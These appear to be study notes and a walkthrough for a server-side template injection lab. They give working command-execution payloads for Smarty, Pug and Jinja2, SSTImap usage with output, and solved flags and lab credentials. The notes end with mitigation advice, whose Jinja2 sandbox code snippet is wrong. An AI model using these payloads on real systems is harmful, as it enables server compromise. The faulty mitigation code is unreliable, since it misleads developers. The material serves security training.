#ssti #Jinja2 

### Introduction

Server-side template Injection, or SSTI, is a vulnerability that occurs when user input is injected into a template engine of an application. This can lead to a range of security issues, including code execution, data exposure, privilege escalation, and Denial of Service (DoS). SSTI vulnerabilities are often found in web applications that use template engines to generate dynamic content and can have serious consequences if left unaddressed.

### Objectives

By the end of this room, you will:

1. Understand the basic functions of template engines and why they are integral to modern web applications.
2. Identify vulnerabilities within web applications that can lead to SSTI.
3. Execute attacks on different template engines such as Smarty (PHP), Jinja2 (Python), and Jade (NodeJS).
4. Apply best practices and mitigation strategies to prevent SSTI in web applications.

### Prerequisites

Before diving into SSTI, you should have a basic understanding of the following concepts:

1. Knowledge of HTML structure and how web pages are built.
2. Basic understanding of JavaScript for client-side scripting.
3. Familiarity with server-side programming concepts and languages (e.g., Python, PHP, JavaScript).

**Note:** This room contains a non-guided challenge in Task 8. You must use the knowledge learned in this room and basic offensive security skills to complete the challenge!


## SSTI Overview


### What is SSTI?

Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is unsafely incorporated into a server-side template, allowing attackers to inject and execute arbitrary code on the server. Template engines are commonly used in web applications to generate dynamic HTML by combining fixed templates with dynamic data. When these engines process user input without proper sanitization, they become susceptible to SSTI attacks.

**Core Concepts of SSTI**

- **Dynamic Content Generation:** Template engines replace placeholders with actual data, allowing applications to generate dynamic HTML pages. This process can be exploited if user inputs are not properly sanitized.
- **User Input as Template Code:** When user inputs are treated as part of the template code, they can introduce harmful logic into the rendered output, leading to SSTI.

The core of SSTI lies in the improper handling of user input within server-side templates. Template engines interpret and execute embedded expressions to generate dynamic content. If an attacker can inject malicious payloads into these expressions, they can manipulate the server-side logic and potentially execute arbitrary code.

### Flow of an SSTI Attack

When user input is directly embedded in templates without proper validation or escaping, attackers can craft payloads that alter the template's behaviour. This can lead to various unintended server-side actions, including:

- Reading or modifying server-side files.
- Executing system commands.
- Accessing sensitive information (e.g., environment variables, database credentials).


## Template Engines

### Template Engines

A template engine is like a machine that helps build web pages dynamically. Here's how it works in simple terms:

Imagine you're making a birthday card for a friend. You want to include their name, age, and a personalized message. Instead of writing a new card from scratch, you use a template with placeholders for the name, age, and message.

A template engine works similarly:

1. **Template**: The engine uses a pre-designed template with placeholders like {{ name }} for dynamic content.
2. **User Input**: The engine receives user input (like a name, age, or message) and stores it in a variable.
3. **Combination**: The engine combines the template with the user input, replacing the placeholders with the actual data.
4. **Output**: The engine generates a final, dynamic web page with the user's input inserted into the template.

Template engines offer various functionalities that speed up the development process but can also introduce risks. Most template engines allow expressions to be used for simple calculations or logic operations within templates.

In the context of SSTI, the template engine's ability to execute code is what makes it vulnerable to attacks. If user input is not properly sanitized, an attacker can inject malicious code, which the template engine will execute, leading to unintended consequences.

### Common Template Engines

Template engines are an integral part of modern web development, allowing developers to generate dynamic HTML content by combining templates with data. Here are some of the most commonly used template engines:

- **Jinja2**: Highly popular in Python applications, known for its expressiveness and powerful rendering capabilities.
- **Twig**: The default template engine for Symfony in PHP, Twig offers a robust environment with secure default settings.
- **Pug/Jade**: Known for its minimal and clean HTML templating syntax, Pug/Jade is popular among Node.js developers.


### How Template Engines Parse and Process Inputs

Template engines work by parsing template files, which contain static content mixed with special syntax for dynamic content. When rendering a template, the engine replaces the dynamic parts with actual data provided at runtime. For example:

```python
from jinja2 import Template

hello_template = Template("Hello, {{ name }}!")
output = hello_template.render(name="World")
print(output)
```

In this example, `{{ name }}` is a placeholder that gets replaced with the value `"World"` during rendering.

### Determining the Template Engine

Different template engines have distinct syntaxes and features, making them vulnerable to SSTI in various ways. Here are some examples of vulnerable template syntaxes:

**Jinja2/Twig**

Jinja2 and Twig are similar in syntax and behavior, making them somewhat challenging to distinguish from each other just by payload responses. However, you can detect their presence by testing their expression-handling capabilities. For example, using the vulnerable VM, if you use the payload {{7*'7'}} in Twig, the output would be 49.

However, if you use the same payload in an application that uses Jinja2, the output would be 7777777

**Jade/Pug**

Pug, formerly known as Jade, uses a different syntax for handling expressions, which can be exploited to identify its usage. Pug/Jade evaluates JavaScript expressions within `#{}`. For example, using the payload #{7*7} would return 49.

Unlike Jinja2 or Twig, Pug/Jade directly allows JavaScript execution within its templates without the need for additional delimiters like {{ }}. For example:

# PHP - Smarty

Smarty is a powerful template engine for PHP that enables developers to separate presentation from business logic, improving application maintainability and scalability. However, its capability to execute PHP functions within templates can expose applications to server-side template injection attacks if not securely configured.

Smarty's flexibility allows for dynamic execution of PHP functions within its templates, which can become a significant security risk. The ability to execute PHP code through template variables or modifiers should be carefully controlled to prevent unauthorized command execution.

### Exploitation

Before crafting a payload, it's essential to confirm if the application really uses Smarty. For example, go to [http://ssti.thm:8000/smarty/](http://ssti.thm:8000/smarty/).

Inject a simple Smarty tag like `{'Hello'|upper}` to see if it will be processed. If the application returns "HELLO", it means that the template engine used by the application is Smarty.

Once you confirm that the site is vulnerable to SSTI via Smarty, you can craft a payload that uses PHP functions that execute system commands. One of the most common functions that do this is the `system()` function. Using the payload `{system("ls")}` is a direct and effective payload if Smarty's security settings allow PHP function execution.

```
{system("cat 7c45b2d3a741398826f497d58b73a401.txt")}
```

## NodeJS - Pug

Pug (formerly known as Jade) is a high-performance template engine widely used in the Node.js community for its concise HTML rendering and advanced features like conditionals, iterations, and template inheritance. While Pug provides powerful tools for developers, its ability to execute JavaScript code directly within templates can pose significant security risks.  

Pug's security vulnerabilities primarily stem from its capability to interpolate JavaScript code within template variables. This feature, designed for dynamic content generation, can be exploited maliciously if user inputs are embedded into the template without proper sanitisation.

Developers must diligently sanitise and validate user inputs to mitigate these risks and ensure the security of applications using Pug.  

**Key Vulnerability Points:**

- **JavaScript Interpolation**: Pug allows embedding JavaScript directly within templates using interpolation braces `#{}`. If user input is interpolated without proper sanitization, it can lead to arbitrary code execution.
- **Default Escaping**: Pug does provide automatic escaping for certain inputs, converting characters like `<`, `>`, and `&` to their HTML entity equivalents to prevent XSS attacks. However, this default behaviour does not cover all potential security issues, particularly when dealing with unescaped interpolation `!{}` or complex input scenarios.

### Exploitation

Before crafting a payload, it is important to confirm if the application indeed uses Pug. For example, go to [http://ssti.thm:8001/jade/](http://ssti.thm:8001/jade/).

Inject a basic Pug syntax to test for template processing, such as `#{7*7}`. If the application outputs 49, it confirms that Pug is processing the template.

Since Pug allows JavaScript interpolation, we can then use the payload `#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}`

The above payload uses Node.js's core modules to execute system commands. Below is the breakdown:

- `root.process` accesses the global `process` object from Node.js within the Pug template.
- `mainModule.require('child_process')` dynamically requires the `child_process` module, bypassing potential restrictions that might prevent its regular inclusion.
- `spawnSync('ls')`: Executes the `ls` command synchronously.
- `.stdout`: Captures the standard output of the command, which includes the directory listing.

```
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}

#{root.process.mainModule.require('child_process').spawnSync('cat 7f58571b42d8c477a2f3efa69a681ac3.txt').stdout}


```

### Why spawnSync('ls -lah') May Not Work

When you try to use `spawnSync('ls -lah')`, you are attempting to pass the entire command and its arguments as a single string. This does not work as expected because spawnSync does not inherently split a single string into a command and its arguments. Instead, it treats the whole string as the command to execute, which it cannot find and thus fails to execute.

This behavior is critical for preventing certain types of security vulnerabilities, such as command injection, where an attacker might try to append additional commands or arguments to execute unintended actions.

### Understanding spawnSync Usage

The `spawnSync` function is designed to execute a command in the shell and provide detailed control over the command's input and output. It's part of Node.js's `child_process` module, which allows Node.js to execute other processes on the system where it is running.

The function signature for `spawnSync` is:

```javascript
spawnSync(command, [args], [options])
```

- **command**: This is a string that specifies the command to run.
- **args**: This is an array of string arguments to pass to the command.
- **options**: This is an optional parameter that can specify various options such as the working directory, environment variables, input, output, timeout, and more.

### Correct Usage of spawnSync

To correctly use `spawnSync` to execute the `ls` command with `-lah` argument, you should separate the command and its arguments into two distinct parts:

```javascript
const { spawnSync } = require('child_process');
const result = spawnSync('ls', ['-lah']);
console.log(result.stdout.toString());
```

In this corrected form:

- **'ls'** is the command.
- **['-lah']** is an array containing all arguments passed to the command.

This structure ensures that the `ls` command is called with `-lah` as its argument, allowing the command to function as intended. So, the final payload will then be `#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`


```
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

#{root.process.mainModule.require('child_process').spawnSync('cat', ['7f58571b42d8c477a2f3efa69a681ac3.txt']).stdout}

THM{1f8c3b32ad3217e84c145398bae00876}
```

## Python - Jinja2

Jinja2 is a popular template engine for Python, renowned for its flexibility and performance. It is extensively used in web applications to render dynamic content, as it allows Python-like expressions to be embedded within HTML. While Jinja2 accelerates development and facilitates the separation of presentation from business logic, its powerful templating capabilities can also introduce significant security risks if not handled properly.

Since Jinja2 allows the execution of Python expressions within the templates, the security risk in Jinja2 often arises from insecure coding practices that allow user input to be executed within templates without proper sanitization. The vulnerability is not inherent in Jinja2 itself but rather in how developers handle user inputs in their templates. Properly sanitizing and validating all user inputs before incorporating them into templates is essential to prevent such security issues.

**Key Vulnerability Points:**

- **Expression Evaluation**: Jinja2 evaluates expressions within curly braces `{{ }}`, which can execute arbitrary Python code if crafted maliciously.
- **Template Inheritance and Imports**: Advanced features like template inheritance and macro imports can be misused to execute unintended code, leading to information disclosure or server manipulation.

### Exploitation

Before crafting a payload, it's crucial to confirm that the application indeed uses Jinja2. For example, go to [http://ssti.thm:8002/jinja2/](http://ssti.thm:8002/jinja2/).

Inject a basic Jinja2 syntax like `{{7*7}}` to check for template processing. If the application returns 49, it indicates that Jinja2 is processing the template.

Once Jinja2's use is confirmed, we can the use the payload `{{"".__class__.__mro__[1].__subclasses__([157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`

```
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```

### Why check_output('ls -lah') Does Not Work

When you use `check_output('ls -lah')`, you're passing the entire command and its arguments as a single string. This is not the recommended way to use `check_output` because it does not parse the string into a command and separate arguments. Instead, it treats the whole string as a single command to execute, which it cannot resolve as a valid executable and thus fails to run.

This method of passing arguments can potentially lead to shell injection vulnerabilities if user-controlled strings are concatenated directly into the command string. By requiring commands and their arguments to be passed as a list, `check_output` minimizes this risk.

### Understanding check_output Usage

The `check_output` function is designed to enhance security by separating the command from its arguments, which helps to prevent shell injection attacks. Here's the general syntax:

```python
subprocess.check_output([command, arg1, arg2])
```

- **command**: A string that specifies the command to execute.
- **arg1, arg2, ...**: Additional arguments that should be passed to the command.

### Correct Usage of check_output

To properly execute the `ls` command with options using `check_output`, you should pass the command and its arguments as separate elements in a list:

```python
subprocess.check_output(['ls', '-lah'])
```

The list **['ls', '-lah']** contains the command `ls` and its argument `-lah`. The command is clearly separated from its arguments, which ensures that each part is correctly handled as intended. So the final payload will then be `{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}`


```
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}

{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', '5d8bea6df83cbb6767a235c4ba54933b.txt'])}}

THM{ecc43642dd6934d37c69598174e6e126}
```


## Automating the Exploitation


**SSTImap** is a tool that automates the process of testing and exploiting SSTI vulnerabilities in various template engines. Hosted on [GitHub](https://github.com/vladko312/SSTImap), it provides a framework for discovering template injection flaws.

If you're using AttackBox, the tool is installed in `/opt/SSTImap` directory. If you're using your own machine, you can install it by cloning the repository from GitHub and setting up its environment. Here's how you can get started:

1. **Clone the Repository**:
    
    ```bash
    git clone https://github.com/vladko312/SSTImap.git
    ```
    
2. **Navigate to the SSTImap Directory**:
    
    ```bash
    cd SSTImap
    ```
    
3. **Install Dependencies** (if any are listed, usually via a `requirements.txt`):
    
    ```bash
    pip install -r requirements.txt
    ```

SSTImap is capable of the following:

- **Template Engine Detection**: SSTImap can help identify the template engine used by a web application, which is crucial for crafting specific exploits.
- **Automated Exploitation**: For known vulnerabilities, SSTImap can automate the process of exploiting them.

You can use SSTImap by providing it with the target URL and any necessary options. Here’s a simple usage example:

```bash
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```

This command attempts to detect the SSTI vulnerability using tailored payloads.


```bash
 
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page=' -e mako

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.3
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; legacy_engines: 2; generic: 3; engines: 17
[*] Loaded request body types: 4

[*] Scanning url: http://ssti.thm:8002/mako/
[*] Testing if Body parameter 'page' is injectable
[*] Mako plugin is testing rendering with tag '*'
[+] Mako plugin has confirmed injection with tag '*' 
[+] SSTImap identified the following injection point:

  Body parameter: page
  Engine: Mako
  Injection: *
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code



```

## Extra-Mile Challenge
### Challenge

Another web app is running on [http://ssti.thm:8080/](http://ssti.thm:8080/). Can you achieve RCE and read the content of the hidden text file in the directory using SSTI?  
**Login credentials:**

- **Username**: admin
- **Password**: admin

```
{{exec('id')}}

{{exec('ls -r /var/www/html/*.txt')}}

/var/www/html/105e15924c1e41bf53ea64afa0fa72b2.txt

{{exec('cat /var/www/html/105e15924c1e41bf53ea64afa0fa72b2.txt')}}

THM{w0rK1Ng_sST1}

```

## Mitigation

Server-side Template Injection (SSTI) can be mitigated by following best practices and implementing security measures in the application's code. Here's how to mitigate SSTI in Smarty, Jade, and Jinja2:

### Jinja2

1. **Sandbox Mode**: Enable the sandboxed environment in Jinja2 to restrict the template's ability to access unsafe functions and attributes. This prevents the execution of arbitrary Python code. For example:
    
    ```python
    from jinja2 import Environment, select_autoescape, sandbox
    
    env = Environment(
        autoescape=select_autoescape(['html', 'xml']),
        extensions=[sandbox.SandboxedEnvironment]
    )
    ```
    
2. **Input Sanitization**: Always sanitize inputs to escape or remove potentially dangerous characters and strings that can be interpreted as code. This is crucial when inputs are directly used in template expressions.
    
3. **Template Auditing**: Regularly review and audit templates for insecure coding patterns, such as directly embedding user input without sanitization.
    

### Jade (Pug)

1. **Avoid Direct JavaScript Evaluation**: Restrict or avoid using Pug’s ability to evaluate JavaScript code within templates. Use alternative methods to handle dynamic content that do not involve direct code execution. For example:
    
    ```pug
    var user = !{JSON.stringify(user)}
    h1= user.name
    ```
    
    Use `!{}` carefully as it allows unescaped output, which can be harmful. Prefer `#{}` which escapes HTML by default.
    
2. **Validate and Sanitize Inputs**: Ensure all user inputs are validated against a strict schema and sanitized before they are rendered by the template engine. This reduces the risk of malicious code execution.
    
3. **Secure Configuration Settings**: Use environment settings and configuration options that minimize risks, such as disabling any features that allow script execution.
    

### Smarty

1. **Disable `{php}` Tags**: Ensure that `{php}` tags are disabled in Smarty configurations to prevent the execution of PHP code within templates.
    
    ```php
    $smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
    $smarty->disable_security = false;
    ```
    
2. **Use Secure Handlers**: If you must allow users to customize templates, provide a secure set of tags or modifiers that they can use, which do not allow direct command execution or shell access.
    
3. **Regular Security Reviews**: Conduct security reviews of the template files and the data handling logic to ensure that no unsafe practices are being used. Regularly update Smarty to keep up with security patches.
    

### Sandboxing in Template Engines

Sandboxing is a security feature that restricts the execution of potentially harmful code within templates. It limits the actions that templates can perform, such as file operations or system command execution. Proper sandboxing helps prevent security issues like SSTI.

**Importance of Sandboxing**

- **Function Restrictions**: Limits the functions or methods that can be called from within the template, blocking potentially harmful operations.
- **Variable and Data Access**: Controls access to global variables or sensitive data, ensuring templates cannot manipulate or expose critical information.

## Conclusion

### Conclusion

Congratulations on completing the Server-Side Template Injection (SSTI) room! Here's a recap of the key concepts we've covered:

- **Template Engine Basics**: We explored how template engines like Jinja2, Pug (Jade), and Smarty work in web development, highlighting their role in dynamically generating web content.
- **Understanding SSTI**: You've learned what SSTI is, how it occurs, and the potential risks associated with template engines when they process user input without proper sanitization.
- **Mitigation Techniques**: Techniques for preventing SSTI, including sandboxing, input validation, and secure configuration of template engines, were discussed to help you secure your applications.
- **Detecting Template Engines**: We covered methods to identify which template engine an application is using through basic payloads, enhancing your ability to tailor security measures to specific environments.